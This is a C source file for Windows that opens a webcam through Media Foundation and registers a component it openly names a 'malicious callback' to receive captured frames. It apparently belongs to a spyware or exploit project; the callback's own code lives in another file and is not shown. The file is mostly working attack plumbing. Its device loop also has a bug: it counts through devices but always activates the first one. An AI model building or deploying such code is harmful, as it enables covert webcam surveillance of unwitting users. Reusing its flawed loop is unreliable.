#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0602
#endif
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "capture.h"
#include "malicious_callback.h"  // Our malicious callback object.
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mfapi.h>  // Added to expose MFCreateAttributes and MFEnumDeviceSources
#include <stdio.h>

#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfuuid.lib")
#pragma comment(lib, "mfreadwrite.lib")

// Global pointers for Media Foundation objects.
static IMFMediaSource* g_pMediaSource = NULL;
IMFSourceReader* g_pSourceReader = NULL;

// Global pointer for our malicious callback object.
static IMFSourceReaderCallback* g_pMaliciousCallback = NULL;

// Global flag to track COM initialization in this module.
static BOOL g_bCoInitialized = FALSE;

// Helper function to log HRESULT errors
void LogHResultError(HRESULT hr, const char* context) {
    LPVOID errorMsg = NULL;
    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        hr,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&errorMsg,
        0,
        NULL
    );
    if (errorMsg) {
        printf("[ERROR] %s: 0x%08lx: %s\n", context, hr, (char*)errorMsg);
        LocalFree(errorMsg);
    } else {
        printf("[ERROR] %s: 0x%08lx\n", context, hr);
    }
}

BOOL InitializeCaptureSession()
{
    HRESULT hr = S_OK;
    IMFAttributes* pAttributes = NULL;
    IMFAttributes* pReaderAttributes = NULL;
    IMFActivate** ppDevices = NULL;
    UINT32 count = 0;
    BOOL bActivated = FALSE;

    // Initialize COM for this thread.
    HRESULT hrCo = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hrCo)) {
        g_bCoInitialized = TRUE;
    } else if (hrCo == RPC_E_CHANGED_MODE) {
        // COM is already initialized with a different threading model; 
        // for our purposes we won't call CoUninitialize later.
        printf("[CAPTURE] COM already initialized with a different threading model.\n");
    } else {
        LogHResultError(hrCo, "CoInitializeEx");
        goto done;
    }

    // Create an attribute store for device enumeration.
    hr = MFCreateAttributes(&pAttributes, 1);
    if (FAILED(hr))
    {
        printf("[CAPTURE] MFCreateAttributes failed: 0x%08lx\n", hr);
        goto done;
    }

    // Set the device type to video capture.
    hr = pAttributes->lpVtbl->SetGUID(pAttributes, 
                                      &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, 
                                      &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
    if (FAILED(hr))
    {
        printf("[CAPTURE] Failed to set device type attribute: 0x%08lx\n", hr);
        goto done;
    }

    // Enumerate video capture devices.
    hr = MFEnumDeviceSources(pAttributes, &ppDevices, &count);
    if (FAILED(hr) || count == 0)
    {
        printf("[CAPTURE] No video capture devices found: 0x%08lx\n", hr);
        goto done;
    }

    // Iterate over all devices and attempt activation.
    for (UINT32 i = 0; i < count; i++) {
        hr = ppDevices[0]->lpVtbl->ActivateObject(ppDevices[0], &IID_IMFMediaSource, (void**)&g_pMediaSource);
        if (SUCCEEDED(hr)) {
            printf("[CAPTURE] Successfully activated device %u.\n", i);
            bActivated = TRUE;
            break;
        } else {
            printf("[CAPTURE] Failed to activate device %u: 0x%08lx\n", i, hr);
            LogHResultError(hr, "ActivateObject for video capture device");
        }
    }
    if (!bActivated) {
        printf("[CAPTURE] No video capture device could be activated.\n");
        goto done;
    }

    // Create a source reader attribute store.
    hr = MFCreateAttributes(&pReaderAttributes, 1);
    if (FAILED(hr))
    {
        printf("[CAPTURE] MFCreateAttributes for reader failed: 0x%08lx\n", hr);
        goto done;
    }

    // Create the malicious callback object.
    g_pMaliciousCallback = CreateMaliciousCallback();
    if (!g_pMaliciousCallback)
    {
        printf("[CAPTURE] Failed to create malicious callback object.\n");
        hr = E_FAIL;
        goto done;
    }

    // Set the asynchronous callback attribute.
    hr = pReaderAttributes->lpVtbl->SetUnknown(pReaderAttributes, &MF_SOURCE_READER_ASYNC_CALLBACK, g_pMaliciousCallback);
    if (FAILED(hr))
    {
        printf("[CAPTURE] Failed to set async callback attribute: 0x%08lx\n", hr);
        goto done;
    }

    // Create the source reader from the media source with our reader attributes.
    hr = MFCreateSourceReaderFromMediaSource(g_pMediaSource, pReaderAttributes, &g_pSourceReader);
    if (FAILED(hr))
    {
        printf("[CAPTURE] MFCreateSourceReaderFromMediaSource failed: 0x%08lx\n", hr);
        goto done;
    }

    printf("[CAPTURE] Malicious callback registered with source reader.\n");

    // Initiate the first asynchronous read. For asynchronous mode, all out parameters are NULL.
    hr = g_pSourceReader->lpVtbl->ReadSample(g_pSourceReader, 
                                               MF_SOURCE_READER_FIRST_VIDEO_STREAM, 
                                               0, 
                                               NULL, NULL, NULL, NULL);
    if (FAILED(hr))
    {
        printf("[CAPTURE] Initial ReadSample call failed: 0x%08lx\n", hr);
        goto done;
    }

    printf("[CAPTURE] Media Foundation capture session started in asynchronous mode.\n");

done:
    if (pAttributes)
        pAttributes->lpVtbl->Release(pAttributes);
    if (pReaderAttributes)
        pReaderAttributes->lpVtbl->Release(pReaderAttributes);
    if (ppDevices)
    {
        for (UINT32 i = 0; i < count; i++)
        {
            ppDevices[i]->lpVtbl->Release(ppDevices[i]);
        }
        CoTaskMemFree(ppDevices);
    }
    return SUCCEEDED(hr);
}

VOID CleanupCaptureSession()
{
    // The source reader will release our callback when it is destroyed.
    // For safety, we release our global reference.
    if (g_pMaliciousCallback)
    {
        g_pMaliciousCallback->lpVtbl->Release(g_pMaliciousCallback);
        g_pMaliciousCallback = NULL;
    }

    if (g_pSourceReader)
    {
        g_pSourceReader->lpVtbl->Release(g_pSourceReader);
        g_pSourceReader = NULL;
    }
    if (g_pMediaSource)
    {
        g_pMediaSource->lpVtbl->Shutdown(g_pMediaSource);
        g_pMediaSource->lpVtbl->Release(g_pMediaSource);
        g_pMediaSource = NULL;
    }
    printf("[CAPTURE] Capture session stopped.\n");

    // Uninitialize COM only if we successfully initialized it in this module.
    if (g_bCoInitialized) {
        CoUninitialize();
        g_bCoInitialized = FALSE;
    }
}
